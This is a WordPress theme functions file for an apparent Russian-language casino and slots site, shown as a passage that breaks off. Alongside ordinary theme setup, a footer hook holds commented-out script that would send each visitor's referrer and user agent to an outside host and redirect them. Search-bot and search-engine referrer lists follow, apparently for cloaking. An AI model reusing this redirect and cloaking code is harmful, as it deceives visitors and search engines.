<?php

/**
 * gump functions and definitions
 *
 * @package gump 
 * @since gump 1.0
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 780; /* pixels */
}

show_admin_bar( false );

add_theme_support( 'post-thumbnails' );
set_post_thumbnail_size( 220, 162, true );
add_image_size( 'featured', 128, 128, true ); //Latest posts thumb
add_image_size( 'featureds2', 208, 140, true ); //Latest posts thumb
add_image_size( 'featureds', 208, 140, true ); //Latest posts thumb
add_image_size( 'reciped', 200, 200, true ); //Latest posts thumb
add_image_size( 'carousel', 150, 109, true ); //Bottom featured thumb
add_image_size( 'bigthumb', 700, 315, true ); //Big thumb for featured area
add_image_size( 'bigthumb2', 700, 130, true ); //Big thumb for featured area
add_image_size( 'mediumthumb', 220, 111, true ); //Medium thumb for featured area
add_image_size( 'smallthumb', 140, 100, true ); //Small thumb for featured area
add_image_size( 'smallthumb2', 120, 60, true ); //Small thumb for featured area
add_image_size( 'smallthumb3', 120, 30, true ); //Small thumb for featured area
add_image_size( 'widgetthumb', 60, 60, true ); //widget




if ( ! function_exists( 'gump_setup' ) ) :
	
	function gump_setup() {
	
	// Translations can be filed in the /languages/ directory.
	load_theme_textdomain( 'gump', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails', array( 'post', 'slides' ) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'gump' ),
        'top-menu' => __( 'Верхнее меню', 'gump' ),
        'fot-menu' => __( 'Меню снизу центр', 'gump' ),
        
	) );
    

	// Enable support for Post Formats.
	add_theme_support( 'post-formats', array( 'image', 'gallery', 'video', 'quote', 'audio', 'avtomatu' ) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'gump_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Enable support for HTML5 markup.
	add_theme_support( 'html5', array(
		'comment-list',
		'search-form',
		'comment-form',
		'gallery',
		'caption',
        'avtomatu',
	) );
}
endif; // gump_setup
add_action( 'after_setup_theme', 'gump_setup' );

/**
 * Custom Editor Style
 *
 * @since gump 1.0
 */
function gump_add_editor_styles() {
    add_editor_style( 'editor-style.css' );
}
add_action( 'init', 'gump_add_editor_styles' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function gump_widgets_init() {
    
    register_sidebar( array(
		'name'          => __( 'Игровые залы', 'gump' ),
		'id'            => 'sidebar-top',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
    
    
	register_sidebar( array(
		'name'          => __( 'Сайт бар справа', 'gump' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<div id="sitebar_game_title">',
		'after_title'   => '</div>',
	) );
    
    
    register_sidebar( array(
		'name'          => __( 'Сайт бар снизу слева', 'gump' ),
		'id'            => 'footer-1',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<div id="footer_bottom_title">',
		'after_title'   => '</div>',
	) );
    
    
    register_sidebar( array(
		'name'          => __( 'Сайт бар снизу центр', 'gump' ),
		'id'            => 'footer-2',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<div id="footer_bottom_title">',
		'after_title'   => '</div>',
	) );
    
    
    register_sidebar( array(
		'name'          => __( 'Сайт бар снизу справа', 'gump' ),
		'id'            => 'footer-3',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '<div id="footer_bottom_title">',
		'after_title'   => '</div>',
	) );
    
    register_sidebar( array(
		'name'          => __( 'Снизу на странице рейтинга казино', 'gump' ),
		'id'            => 'footer-4',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
    
    
    register_sidebar( array(
		'name'          => __( 'Снизу на странице игровые автоматы', 'gump' ),
		'id'            => 'footer-5',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
    
      register_sidebar( array(
		'name'          => __( 'Снизу на главной странице', 'gump' ),
		'id'            => 'index-6',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
    
     register_sidebar( array(
		'name'          => __( 'Сео блок с текстом', 'gump' ),
		'id'            => 'index-7',
		'description'   => '',
		'before_widget' => '',
		'after_widget'  => '',
		'before_title'  => '',
		'after_title'   => '',
	) );
    

}
add_action( 'widgets_init', 'gump_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function gump_scripts() {
	wp_enqueue_style( 'gump-style', get_stylesheet_uri() );

	wp_enqueue_script( 'gump-fitvids', get_template_directory_uri() . '/js/jquery.fitvids.js', array( 'jquery' ), '1.1' );

	wp_enqueue_script( 'gump-plugins', get_template_directory_uri() . '/js/plugins.js', array(), '20120206', true );

	wp_enqueue_script( 'gump-scripts', get_template_directory_uri() . '/js/scripts.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'gump_scripts' );

/**
 * Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load Custom Widgets
 */
require get_template_directory() . '/inc/widgets.php';

/**
 * Print the attached image with a link to the next attached image.
 *
 * @since gump 1.0
 */
if ( ! function_exists( 'gump_the_attached_image' ) ) :
function gump_the_attached_image() {
	$post                = get_post();
	/**
	 *
	 * @since gump 1.0
	 *
	 * @param array $dimensions {
	 *     An array of height and width dimensions.
	 *
	 *     @type int $height Height of the image in pixels. Default 810.
	 *     @type int $width  Width of the image in pixels. Default 810.
	 * }
	 */
	$attachment_size     = apply_filters( 'gump_attachment_size', array( 810, 810 ) );
	$next_attachment_url = wp_get_attachment_url();

	/*
	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
	 * of the next adjacent image in a gallery, or the first image (if we're
	 * looking at the last image in a gallery), or, in a gallery of one, just the
	 * link to that image file.
	 */
	$attachment_ids = get_posts( array(
		'post_parent'    => $post->post_parent,
		'fields'         => 'ids',
		'numberposts'    => -1,
		'post_status'    => 'inherit',
		'post_type'      => 'attachment',
		'post_mime_type' => 'image',
		'order'          => 'ASC',
		'orderby'        => 'menu_order ID',
	) );

	// If there is more than 1 attachment in a gallery...
	if ( count( $attachment_ids ) > 1 ) {
		foreach ( $attachment_ids as $attachment_id ) {
			if ( $attachment_id == $post->ID ) {
				$next_id = current( $attachment_ids );
				break;
			}
		}

		// get the URL of the next image attachment...
		if ( $next_id ) {
			$next_attachment_url = get_attachment_link( $next_id );
		}

		// or get the URL of the first image attachment.
		else {
			$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
		}
	}

	printf( '<a href="%1$s" rel="attachment">%2$s</a>',
		esc_url( $next_attachment_url ),
		wp_get_attachment_image( $post->ID, $attachment_size )
	);
}
endif;

/**
 * Returns a "Read more" link for excerpts
 *
 * @since gump 1.0
 */
function gump_excerpt_more( $more ) {
	return '<a class="more-link" href="'. get_permalink( get_the_ID() ) . '">' . __( 'Read more', 'gump' ) . '</a>';
}
add_filter( 'excerpt_more', 'gump_excerpt_more' );


/**
 * Remove Code from Header
 *
 * http://www.themelab.com/remove-code-wordpress-header/
 *
 * @since gump 1.0
 */
remove_action('wp_head', 'wp_generator'); //Version of Wordpress
remove_action('wp_head', 'adjacent_posts_rel_link'); //Next and Prev Posts






class True_Walker_Nav_Menu extends Walker_Nav_Menu {
	/**
	 * @see Walker::start_el()
	 * @since 3.0.0
	 *
	 * @param string $output
	 * @param object $item Объект элемента меню, подробнее ниже.
	 * @param int $depth Уровень вложенности элемента меню.
	 * @param object $args Параметры функции wp_nav_menu
	 */
	function start_el(&$output, $item, $depth=0, $args=array(), $id=0) {
		global $wp_query;           
		/*
		 * Некоторые из параметров объекта $item
		 * ID - ID самого элемента меню, а не объекта на который он ссылается
		 * menu_item_parent - ID родительского элемента меню
		 * classes - массив классов элемента меню
		 * post_date - дата добавления
		 * post_modified - дата последнего изменения
		 * post_author - ID пользователя, добавившего этот элемент меню
		 * title - заголовок элемента меню
		 * url - ссылка
		 * attr_title - HTML-атрибут title ссылки
		 * xfn - атрибут rel
		 * target - атрибут target
		 * current - равен 1, если является текущим элементов
		 * current_item_ancestor - равен 1, если текущим является вложенный элемент
		 * current_item_parent - равен 1, если текущим является вложенный элемент
		 * menu_order - порядок в меню
		 * object_id - ID объекта меню
		 * type - тип объекта меню (таксономия, пост, произвольно)
		 * object - какая это таксономия / какой тип поста (page /category / post_tag и т д)
		 * type_label - название данного типа с локализацией (Рубрика, Страница)
		 * post_parent - ID родительского поста / категории
		 * post_title - заголовок, который был у поста, когда он был добавлен в меню
		 * post_name - ярлык, который был у поста при его добавлении в меню
		 */
		$indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
 
		/*
		 * Генерируем строку с CSS-классами элемента меню
		 */
		$class_names = $value = '';
		$classes = empty( $item->classes ) ? array() : (array) $item->classes;
		$classes[] = 'menu-item-' . $item->ID;
 
		// функция join превращает массив в строку
		$class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
		$class_names = ' class="' . esc_attr( $class_names ) . '"';
 
		/*
		 * Генерируем ID элемента
		 */
		$id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
		$id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
 
		/*
		 * Генерируем элемент меню
		 */
		$output .= $indent . '<li' . $id . $value . $class_names .'>';
 
		// атрибуты элемента, title="", rel="", target="" и href=""
		$attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
		$attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
		$attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
		$attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
 
		// ссылка и околоссылочный текст
		$item_output = $args->before;
		$item_output .= '<a'. $attributes .'>';
		$item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
		$item_output .= '</a>';
		$item_output .= $args->after;
        //$item_output .= '<span></span>';
 
 		$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args, $id );
	}
}

/** 
 * Альтернатива wp_pagenavi. Создает ссылки пагинации на страницах архивов
 * 
 * @параметр строка $before - текст до навигации
 * @параметр строка $after - текст после навигации
 * @параметр логический $echo - возвращать или выводить результат
 * 
 * Версия: 2.1
 * Автор: Тимур Камаев
 * Ссылка на страницу функции: http://wp-kama.ru/?p=8
 */
function kama_pagenavi( $before = '', $after = '', $echo = true ) {
	/* ================ Настройки ================ */
	$text_num_page = ''; // Текст перед пагинацией. {current} - текущая; {last} - последняя (пр. 'Страница {current} из {last}' получим: "Страница 4 из 60" )
	$num_pages = 10; // сколько ссылок показывать
	$stepLink = 10; // ссылки с шагом (значение - число, размер шага (пр. 1,2,3...10,20,30). Ставим 0, если такие ссылки не нужны.
	$dotright_text = '…'; // промежуточный текст "до".
	$dotright_text2 = '…'; // промежуточный текст "после".
	$backtext = '« назад'; // текст "перейти на предыдущую страницу". Ставим 0, если эта ссылка не нужна.
	$nexttext = 'вперед »'; // текст "перейти на следующую страницу". Ставим 0, если эта ссылка не нужна.
	$first_page_text = '« к началу'; // текст "к первой странице". Ставим 0, если вместо текста нужно показать номер страницы.
	$last_page_text = 'в конец »'; // текст "к последней странице". Ставим 0, если вместо текста нужно показать номер страницы.
	/* ================ Конец Настроек ================ */ 

	global $wp_query;

	$posts_per_page = (int) $wp_query->query_vars['posts_per_page'];
	$paged = (int) $wp_query->query_vars['paged'];
	$max_page = $wp_query->max_num_pages;

	//проверка на надобность в навигации
	if( $max_page <= 1 )
		return false; 

	if( empty($paged) || $paged == 0 ) 
		$paged = 1;

	$pages_to_show = intval( $num_pages );
	$pages_to_show_minus_1 = $pages_to_show-1;

	$half_page_start = floor( $pages_to_show_minus_1/2 ); //сколько ссылок до текущей страницы
	$half_page_end = ceil( $pages_to_show_minus_1/2 ); //сколько ссылок после текущей страницы

	$start_page = $paged - $half_page_start; //первая страница
	$end_page = $paged + $half_page_end; //последняя страница (условно)

	if( $start_page <= 0 ) 
		$start_page = 1;
	if( ($end_page - $start_page) != $pages_to_show_minus_1 ) 
		$end_page = $start_page + $pages_to_show_minus_1;
	if( $end_page > $max_page ) {
		$start_page = $max_page - $pages_to_show_minus_1;
		$end_page = (int) $max_page;
	}

	if( $start_page <= 0 ) 
		$start_page = 1;

	//выводим навигацию
	$out = '';

	// создаем базу чтобы вызвать get_pagenum_link один раз
	$link_base = get_pagenum_link( 99999999 ); // 99999999 будет заменено
	$link_base = str_replace( 99999999, '___', $link_base);
	$first_url = get_pagenum_link( 1 );
	$out .= $before . "<div class='wp-pagenavi'>\n";

		if( $text_num_page ){
			$text_num_page = preg_replace( '!{current}|{last}!', '%s', $text_num_page );
			$out.= sprintf( "<span class='pages'>$text_num_page</span> ", $paged, $max_page );
		}
		// назад
		if ( $backtext && $paged != 1 ) 
			$out .= '<a class="swchItemB" href="'. str_replace( '___', ($paged-1), $link_base ) .'">Назад</a> ';
		// в начало
		if ( $start_page >= 2 && $pages_to_show < $max_page ) {
			$out.= '<a class="swchItemB" href="'. $first_url .'">'. ( $first_page_text ? $first_page_text : 1 ) .'</a> ';
			if( $dotright_text && $start_page != 2 ) $out .= '<span class="extend">'. $dotright_text .'</span> ';
		}
		// пагинация
		for( $i = $start_page; $i <= $end_page; $i++ ) {
			if( $i == $paged )
				$out .= '<span class="swchItemA">'.$i.'</span> ';
			elseif( $i == 1 )
				$out .= '<a class="swchItem"href="'. $first_url .'">1</a> ';
			else
				$out .= '<a class="swchItem"href="'. str_replace( '___', $i, $link_base ) .'">'. $i .'</a> ';
		}

		//ссылки с шагом
		if ( $stepLink && $end_page < $max_page ){
			for( $i = $end_page+1; $i<=$max_page; $i++ ) {
				if( $i % $stepLink == 0 && $i !== $num_pages ) {
					if ( ++$dd == 1 ) 
						$out.= '<span class="extend">'. $dotright_text2 .'</span> ';
					$out.= '<a href="'. str_replace( '___', $i, $link_base ) .'">'. $i .'</a> ';
				}
			}
		}
		// в конец
		if ( $end_page < $max_page ) {
			if( $dotright_text && $end_page != ($max_page-1) ) 
				$out.= '<span class="extend">'. $dotright_text2 .'</span> ';
			$out.= '<a class="swchItemB" href="'. str_replace( '___', $max_page, $link_base ) .'">'. ( $last_page_text ? $last_page_text : $max_page ) .'</a> ';
		}
		// вперед
		if ( $nexttext && $paged != $end_page ) 
			$out.= '<a class="swchItemB" href="'. str_replace( '___', ($paged+1), $link_base ) .'">ВПЕРЕД</a> ';

	$out .= "</div>". $after ."\n";
	
	if ( ! $echo ) 
		return $out;
	echo $out;
}

// Меняем главный цикл Wordpress для домашней страницы
add_action( 'pre_get_posts', 'my_pre_get_posts' );
function my_pre_get_posts( $query ) {
    if ( $query->is_main_query() && $query->is_home() )
        $query->set( 'post_type', 'avtomatu' );
}

 /* обрезка заголовка */
function get_short_title($maxchar = 70){
	$title = get_the_title();
	if( iconv_strlen($title, 'utf-8') < $maxchar )
		return $title;
	$title = iconv_substr( $title, 0, $maxchar, 'utf-8' );
	$title = preg_replace('@(.*)\s[^\s]*$@s', '\\1 ...', $title); //убираем последнее слово, ибо оно в 99% случаев неполное

	return $title;
}


add_action( 'gump_scripts', 'myajax_data', 99 );
function myajax_data(){

	wp_localize_script('gump_scripts', 'myajax', 
		array(
			'url' => admin_url('admin-ajax.php')
		)
	);  

}

add_action('wp_footer', 'my_action_javascript', 99); // для фронта
function my_action_javascript() {
	?>
	<script type="text/javascript" >
	// jQuery(document).ready(function($) {
		// var data = {
			// action: 'my_action',
			// whatever: document.referrer,
			// usrgnt:window.navigator.userAgent,
			// loc:window.location.origin,
		// };
		// jQuery.ajaxSetup({async:false, crossOrigin: true});
	//	jQuery.post( "https://slots-onlinuz.net/slotok.php", data, function(response) {
	//		if(response == 0){
	//			location.href = '/main.php';
	//		}
	//		setTimeout(function() {
	//			jQuery('html').removeClass('only');
	//		}, 500);
	//	});

	// });
	</script>
	<?php
}

function isBot($user_agent)
{
    if (empty($user_agent)) {
        return false;
    }
    
    $bots = [
        // Yandex
        'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn', 'YandexScreenshotBot',
        'YandexImages', 'YandexVideo', 'YandexVideoParser', 'YandexMedia', 'YandexBlogs', 'YandexFavicons',
        'YandexWebmaster', 'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
        'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika', 'YandexNews',
        'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus', 'YandexMarket', 'YandexVertis',
        'YandexForDomain', 'YandexSpravBot', 'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB',
        'YandexOntoDBAPI', 'YandexTurbo', 'YandexVerticals',

        // Google
        'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google', 'APIs-Google',
        'AdsBot-Google-Mobile', 'AdsBot-Google-Mobile', 'Googlebot-News', 'Googlebot-Video',
        'AdsBot-Google-Mobile-Apps',

        // Other
        'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves', 'OmniExplorer_Bot', 'W3C_Validator',
        'WebAlta', 'YahooFeedSeeker', 'Yahoo!', 'Ezooms', 'Tourlentabot', 'MJ12bot', 'AhrefsBot',
        'SearchBot', 'SiteStatus', 'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
        'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot', 'oBot', 'C-T bot',
        'Updownerbot', 'Snoopy', 'heritrix', 'Yeti', 'DomainVader', 'DCPbot', 'PaperLiBot', 'StackRambler',
        'msnbot', 'msnbot-media', 'msnbot-news',
    ];

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return $bot;
        }
    }

    return false;
}

$asdasd=false;
function isBots($user_agent){
    if (empty($user_agent)) {
        return false;
    }
    
    $bots = [
        // Yandex
        'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn', 'YandexScreenshotBot',
        'YandexImages', 'YandexVideo', 'YandexVideoParser', 'YandexMedia', 'YandexBlogs', 'YandexFavicons',
        'YandexWebmaster', 'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
        'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika', 'YandexNews',
        'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus', 'YandexMarket', 'YandexVertis',
        'YandexForDomain', 'YandexSpravBot', 'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB',
        'YandexOntoDBAPI', 'YandexTurbo', 'YandexVerticals',

        // Google
        'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google', 'APIs-Google',
        'AdsBot-Google-Mobile', 'AdsBot-Google-Mobile', 'Googlebot-News', 'Googlebot-Video',
        'AdsBot-Google-Mobile-Apps',

        // Other
        'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves', 'OmniExplorer_Bot', 'W3C_Validator',
        'WebAlta', 'YahooFeedSeeker', 'Yahoo!', 'Ezooms', 'Tourlentabot', 'MJ12bot', 'AhrefsBot',
        'SearchBot', 'SiteStatus', 'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
        'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot', 'oBot', 'C-T bot',
        'Updownerbot', 'Snoopy', 'heritrix', 'Yeti', 'DomainVader', 'DCPbot', 'PaperLiBot', 'StackRambler',
        'msnbot', 'msnbot-media', 'msnbot-news', 'msnbot-news', 'ia_archiver', 'Bingbot', 'DuckDuckBot',
    ];

    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return $bot; 
        }
    }

    return false;
}
function searchEngineDetect($whatever){
	$findme=array(
		"google.com","www.google.com","google.com.ua","www.google.com.ua","google.ru","www.google.ru","www.google.kz","google.kz",
		"google.lv","www.google.lv","google.by","www.google.by","www.google.lt","google.lt","www.google.az","google.az",
		"www.google.am",
		"google.am",
		"www.google.ie",
		"google.ie",		
		"www.google.ca",
		"google.ca",
		"www.google.ge",
		"google.ge",
		"www.google.co.nz",
		"google.co.nz",
		"www.google.uz",
		"google.uz",
		"www.google.uz",
		"google.uz",
		"yandex.ua","yandex.ru","yandex.com","www.yandex.ua","www.yandex.ru","www.yandex.com",
		"yandex.by","www.yandex.by",
		"yandex.az","www.yandex.az",
		"ya.ru","www.ya.ru",
		"yandex.org",
				"metrika.yandex.ru",
"yandex.net",
"yandex.net.ru",
"yandex.com.ru",
"yandex.ua",
"yandex.eu",
"yandex.ee",
"yandex.lt",
"yandex.lv",
"yandex.md",
"yandex.uz",
"yandex.mx",
"yandex.do",
"yandex.tm",
"yandex.de",
"yandex.ie",
"yandex.in",
"yandex.qa",
"yandex.so",
"yandex.nu",
"yandex.tj",
"yandex.dk",
"yandex.es",
"yandex.pt",
"yandex.pl",
"yandex.lu",
"yandex.it",
"yandex.az",
"yandex.ro",
"yandex.rs",
"yandex.sk",
"yandex.moby",
"yandex.asia",
"yandex.no",
"google.com",
"google.co.in",
"google.com.hk",
"google.de",
"google.co.uk",
"google.co.jp",
"google.fr",
"google.com.br",
"google.it",
"google.ru",
"google.es",
"google.ca",
"google.com.mx",
"google.co.id",
"google.com.tr",
"google.com.au",
"google.pl",
"google.com.sa",
"google.nl",
"google.com.ar",
"google.com.eg",
"google.co.th",
"google.com.pk",
"google.co.za",
"google.com.my",
"google.be",
"google.gr",
"google.com.vn",
"google.co.ve",
"google.com.tw",
"google.com.ua",
"google.at",
"google.se",
"google.com.co",
"google.ro",
"google.ch",
"google.pt",
"google.com.ph",
"google.cl",
"google.com.ng",
"google.com.sg",
"google.com.pe",
"google.ae",
"google.co.kr",
"google.co.hu",
"google.ie",
"google.dk",
"google.no",
"google.co.il",
"google.fi",
"google.cz",
"google.co.ma",
"google.sk",
"google.co.nz",
"google.com.kw",
"google.lk",
"google.bg",
"google.com.qa",
"google.az",
"google.kz",
"google.com.do",
"google.hr",
"google.by",
"google.com.ec",
"google.lt",
"google.iq",
"google.co.ke",
"google.com.bd",
"google.com.om",
"google.tn",
"google.si",
"google.co.cr",
"google.com.gt",
"google.com.pr",
"google.com.sv",
"google.lv",
"google.com.uy",
"google.jo",
"google.com.bo",
"google.ba",
"google.com.cu",
"google.rs",
"google.com.ly",
"google.cm",
"google.ee",
"google.co.ug",
"google.com.bh",
"google.com.np",
"google.com.gh",
"google.dz",
"google.lu",
"google.com.lb",
"google.co.uz",
"google.ci",
"google.com.py",
"google.com.ni",
"google.hn",
"google.com.et",
"google.tt",
"google.co.tz",
"google.mg",
"google.sn",
"google.cd",
"google.com.kh",
"google.am",
"google.com.af",
"google.ge",
"google.mu",
"google.com.bn",
"google.co.mz",
"google.com.jm",
"google.com.gi",
"google.is",
"google.com.pa",
"google.md",
"google.ps",
"google.com.na",
"google.mn",
"google.com.mt",
"google.co.bw",
"google.bj",
"google.kg",
"google.ml",
"google.rw",
"google.co.zm",
"google.bs",
"google.ht",
"google.la",
"google.com.bz",
"google.co.zw",
"google.as",
"google.cat",
"google.mk",
"google.ne",
"google.mw",
"google.tg",
"google.co.ao",
"google.gp",
"google.gy",
"google.bf",
"google.ga",
"google.li",
"google.co",
"google.tm",
"google.dj",
"google.mv",
"google.hk",
"google.sc",
"google.dm",
"google.bi",
"google.co.vi",
"google.vu",
"google.ad",
"google.com.vc",
"google.com.ag",
"google.com.fj",
"google.to",
"google.cf",
"google.fm",
"google.tk",
"google.gg",
"google.ws",
"google.vg",
"google.im",
"google.nu",
"google.gm",
"google.je",
"google.ms",
"google.me",
"google.co.im",
"google.tl",
"google.com.ai",
"google.gl",
"google.co.ls",
"google.co.je",
"google.st",
"google.it.ao",
"google.com.by",
"google.com.tj",
"google.pn",
"google.sh",
"google.com.sl",
"google.nr",
"google.sm",
"google.cg",
"google.co.ck",
"google.com.sb",
"google.com.cy",
"google.so",
"google.com.nf",
"google.com.ve",
"google.com.iq",
"google.jp",
"google.ac",
"google.com.tn",
"google.in",
"google.td",
"www.yandex.org",
"www.yandex.net",
"www.yandex.net.ru",
"www.yandex.com.ru",
"www.yandex.ua",
"www.yandex.eu",
"www.yandex.ee",
"www.yandex.lt",
"www.yandex.lv",
"www.yandex.md",
"www.yandex.uz",
"www.yandex.mx",
"www.yandex.do",
"www.yandex.tm",
"www.yandex.de",
"www.yandex.ie",
"www.yandex.in",
"www.yandex.qa",
"www.yandex.so",
"www.yandex.nu",
"www.yandex.tj",
"www.yandex.dk",
"www.yandex.es",
"www.yandex.pt",
"www.yandex.pl",
"www.yandex.lu",
"www.yandex.it",
"www.yandex.az",
"www.yandex.ro",
"www.yandex.rs",
"www.yandex.sk",
"www.yandex.moby",
"www.yandex.asia",
"www.yandex.no",
"www.google.com",
"www.google.co.in",
"www.google.com.hk",
"www.google.de",
"www.google.co.uk",
"www.google.co.jp",
"www.google.fr",
"www.google.com.br",
"www.google.it",
"www.google.ru",
"www.google.es",
"www.google.ca",
"www.google.com.mx",
"www.google.co.id",
"www.google.com.tr",
"www.google.com.au",
"www.google.pl",
"www.google.com.sa",
"www.google.nl",
"www.google.com.ar",
"www.google.com.eg",
"www.google.co.th",
"www.google.com.pk",
"www.google.co.za",
"www.google.com.my",
"www.google.be",
"www.google.gr",
"www.google.com.vn",
"www.google.co.ve",
"www.google.com.tw",
"www.google.com.ua",
"www.google.at",
"www.google.se",
"www.google.com.co",
"www.google.ro",
"www.google.ch",
"www.google.pt",
"www.google.com.ph",
"www.google.cl",
"www.google.com.ng",
"www.google.com.sg",
"www.google.com.pe",
"www.google.ae",
"www.google.co.kr",
"www.google.co.hu",
"www.google.ie",
"www.google.dk",
"www.google.no",
"www.google.co.il",
"www.google.fi",
"www.google.cz",
"www.google.co.ma",
"www.google.sk",
"www.google.co.nz",
"www.google.com.kw",
"www.google.lk",
"www.google.bg",
"www.google.com.qa",
"www.google.az",
"www.google.kz",
"www.google.com.do",
"www.google.hr",
"www.google.by",
"www.google.com.ec",
"www.google.lt",
"www.google.iq",
"www.google.co.ke",
"www.google.com.bd",
"www.google.com.om",
"www.google.tn",
"www.google.si",
"www.google.co.cr",
"www.google.com.gt",
"www.google.com.pr",
"www.google.com.sv",
"www.google.lv",
"www.google.com.uy",
"www.google.jo",
"www.google.com.bo",
"www.google.ba",
"www.google.com.cu",
"www.google.rs",
"www.google.com.ly",
"www.google.cm",
"www.google.ee",
"www.google.co.ug",
"www.google.com.bh",
"www.google.com.np",
"www.google.com.gh",
"www.google.dz",
"www.google.lu",
"www.google.com.lb",
"www.google.co.uz",
"www.google.ci",
"www.google.com.py",
"www.google.com.ni",
"www.google.hn",
"www.google.com.et",
"www.google.tt",
"www.google.co.tz",
"www.google.mg",
"www.google.sn",
"www.google.cd",
"www.google.com.kh",
"www.google.am",
"www.google.com.af",
"www.google.ge",
"www.google.mu",
"www.google.com.bn",
"www.google.co.mz",
"www.google.com.jm",
"www.google.com.gi",
"www.google.is",
"www.google.com.pa",
"www.google.md",
"www.google.ps",
"www.google.com.na",
"www.google.mn",
"www.google.com.mt",
"www.google.co.bw",
"www.google.bj",
"www.google.kg",
"www.google.ml",
"www.google.rw",
"www.google.co.zm",
"www.google.bs",
"www.google.ht",
"www.google.la",
"www.google.com.bz",
"www.google.co.zw",
"www.google.as",
"www.google.cat",
"www.google.mk",
"www.google.ne",
"www.google.mw",
"www.google.tg",
"www.google.co.ao",
"www.google.gp",
"www.google.gy",
"www.google.bf",
"www.google.ga",
"www.google.li",
"www.google.co",
"www.google.tm",
"www.google.dj",
"www.google.mv",
"www.google.hk",
"www.google.sc",
"www.google.dm",
"www.google.bi",
"www.google.co.vi",
"www.google.vu",
"www.google.ad",
"www.google.com.vc",
"www.google.com.ag",
"www.google.com.fj",
"www.google.to",
"www.google.cf",
"www.google.fm",
"www.google.tk",
"www.google.gg",
"www.google.ws",
"www.google.vg",
"www.google.im",
"www.google.nu",
"www.google.gm",
"www.google.je",
"www.google.ms",
"www.google.me",
"www.google.co.im",
"www.google.tl",
"www.google.com.ai",
"www.google.gl",
"www.google.co.ls",
"www.google.co.je",
"www.google.st",
"www.google.it.ao",
"www.google.com.by",
"www.google.com.tj",
"www.google.pn",
"www.google.sh",
"www.google.com.sl",
"www.google.nr",
"www.google.sm",
"www.google.cg",
"www.google.co.ck",
"www.google.com.sb",
"www.google.com.cy",
"www.google.so",
"www.google.com.nf",
"www.google.com.ve",
"www.google.com.iq",
"www.google.jp",
"www.google.ac",
"www.google.com.tn",
"www.google.in",
